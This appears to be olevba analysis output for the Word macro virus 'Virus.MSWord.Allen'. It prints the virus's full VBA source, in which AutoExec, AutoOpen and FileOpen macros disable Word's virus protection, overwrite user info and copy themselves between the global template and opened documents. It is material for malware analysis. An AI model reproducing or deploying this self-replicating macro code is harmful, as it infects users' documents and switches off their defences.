olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Allen - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoExec.MAIN"
On Error GoTo tamat
Dim Bln
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Bln = WordBasic.Month(WordBasic.Now())
Dim Pesan1$, Pesan2$
Pesan1$ = "GepenkUajy96 Lahq"
Pesan2$ = "Cintaku tulus Buat sayangku Allena Hivianta Questasari"
WordBasic.ToolsOptionsUserInfo Name:="GepenkUajy96", Initials:="Allena", Address:="mlampah@hotmail.com" + Chr(13) + "Liguina Allena Hivianta Questasari"
     If Bln = 11 Then
      Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "SELAMAT ULANG TAHUN..ALLEN"
            .Heading = "God bless you"
            .Show
        End With
     End If
tamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Allen - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
Dim NFile$
Dim NMakro$
Options.VirusProtection = False
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
      On Error GoTo tamat
      If Month(Now()) = 11 Then
      Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "SELAMAT ULANG TAHUN..ALLEN"
            .Heading = "My heart to you"
            .Show
        End With
       End If
tamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Allen - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "My Love to LIGUINA ALLENA HIVIANTA QUESTASARI"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileOpen.MAIN"
Dim TotalMacro
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
ReDim BadMacro__$(20)
Options.VirusProtection = False
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo tamat
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TotalMacro = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    BadMacro__$(i) = MN$
    TotalMacro = TotalMacro + 1
Next i
FN$ = WordBasic.[FileName$]()
If TotalMacro >= 1 Then
    For i = 1 To TotalMacro
        On Error GoTo -1: On Error GoTo tamat
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=BadMacro__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo tamat
    NMakro$ = NFile$ + ":Tools"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
tamat:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

